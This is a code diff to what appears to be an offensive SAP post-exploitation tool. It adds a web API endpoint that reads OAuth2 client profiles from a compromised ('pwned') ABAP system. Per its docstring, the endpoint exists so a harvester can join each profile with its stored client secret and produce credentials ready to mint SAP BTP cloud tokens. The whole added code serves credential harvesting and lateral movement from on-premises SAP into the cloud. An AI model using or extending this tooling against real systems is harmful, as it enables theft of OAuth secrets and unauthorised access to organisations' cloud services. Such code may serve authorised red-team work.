@@ -2971,6 +2971,42 @@ def create_app(api: SAPMAPApi) -> Bottle:
                 f"Could not schedule scan for {sid}"})
         return json.dumps({"status": "started"})
 
+    @app.route("/api/node/<sid>/read_oa2c", method="POST")
+    def node_read_oa2c(sid):
+        """Read transaction OA2C_CONFIG's tables (OA2C_CLIENT +
+        OA2C_CLIENT_EXT) on a pwned ABAP target, populating
+        node.oauth2_profiles.  After this finishes, the on-prem ->
+        BTP harvester can join each profile to its
+        /OA2C/CS_<CLIENT_UUID>_NN secstore entry for a complete
+        (client_id, client_secret, token_endpoint) tuple ready to
+        mint a BTP token.
+
+        Idempotent — reruns just refresh the list.
+        """
+        from sap_oa2c import read_oa2c_profiles
+        response.content_type = "application/json"
+        node = api.state.get_node(sid)
+        if not node:
+            return json.dumps({"error": f"Node {sid} not found"})
+
+        def _run():
+            try:
+                profiles = read_oa2c_profiles(node)
+            except Exception as e:
+                print(f"[-] {sid}: OA2C read failed — {e!s}")
+                return
+            node.oauth2_profiles = profiles
+            n_btp = sum(1 for p in profiles
+                         if "hana.ondemand.com"
+                            in (p.get("token_endpoint") or ""))
+            print(f"[+] {sid}: OA2C read complete — {len(profiles)} "
+                  f"profile(s) total, {n_btp} BTP-bound.  Run "
+                  f"Harvest BTP Credentials to surface them as mint "
+                  f"candidates.")
+
+        _bg(f"{sid}:read_oa2c", "Read OA2C OAuth Profiles", _run)
+        return json.dumps({"status": "started"})
+
     @app.route("/api/node/<sid>/harvest_btp_creds", method="POST")
     def node_harvest_btp_creds(sid):
         """Scan a pwned on-prem node for stored BTP-bound credentials
